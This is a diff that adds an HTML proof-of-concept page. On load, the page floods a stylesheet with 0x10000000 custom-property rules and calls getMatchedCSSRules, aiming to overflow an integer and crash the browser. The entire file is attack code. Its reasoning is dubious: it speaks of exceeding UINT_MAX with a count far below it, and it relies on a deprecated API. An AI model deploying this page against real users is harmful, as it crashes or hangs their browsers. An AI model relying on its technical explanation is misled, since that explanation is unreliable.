@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Vulnerability PoC</title>
+<style>
+  #target {
+    color: red;
+  }
+</style>
+</head>
+<body>
+<div id="target">This is the target element.</div>
+<script>
+  function triggerVulnerability() {
+    let target = document.getElementById('target');
+    let sheet = document.styleSheets[0];
+    // The number of rules needed to trigger the vulnerability will
+    // depend on the size of the CSSRule object and the specifics of the
+    // memory allocator. 0x10000000 is a good starting point.
+    // We will try to allocate a vector with a size larger than UINT_MAX.
+    let numRules = 0x10000000;
+    try {
+        for (let i = 0; i < numRules; i++) {
+            sheet.insertRule(`#target { --custom-property-${i}: ${i}; }`, sheet.cssRules.length);
+        }
+    } catch (e) {
+        // The browser will likely crash before this is reached.
+        console.log("Error inserting rules, but that's expected.", e);
+    }
+
+    // This will trigger the reallocation and the integer overflow.
+    let rules = window.getMatchedCSSRules(target);
+    console.log("If you see this, the PoC failed.", rules);
+  }
+
+  // We run this in a timeout to make sure the page has loaded.
+  setTimeout(triggerVulnerability, 100);
+</script>
+</body>
+</html>
